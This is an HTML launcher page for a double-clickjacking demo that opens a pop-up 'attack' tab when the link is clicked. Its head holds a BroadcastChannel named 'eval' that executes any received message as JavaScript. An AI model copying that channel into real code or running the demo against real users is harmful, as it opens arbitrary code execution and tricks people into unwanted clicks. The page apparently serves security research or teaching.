<!doctype html>
<html>
  <head>
    <title>Double-clickjacking demo</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script>
      new BroadcastChannel('eval').onmessage = (e) => new Function(e.data)()
    </script>
  </head>
  <body>
    <h1>Double-clickjacking demo</h1>

    Click <a href="#" id="start">here</a> to start the attack.

    <script>
      document.getElementById('start').addEventListener('click', (event) => {
        event.preventDefault()
        const attackTab = window.open('attack', 'blog-attack')
        if (!attackTab) {
          alert('Please allow pop-ups for this site.')
          return
        }
      })
    </script>
    <style>
      body {
        font-family: sans-serif;
      }
    </style>
  </body>
</html>
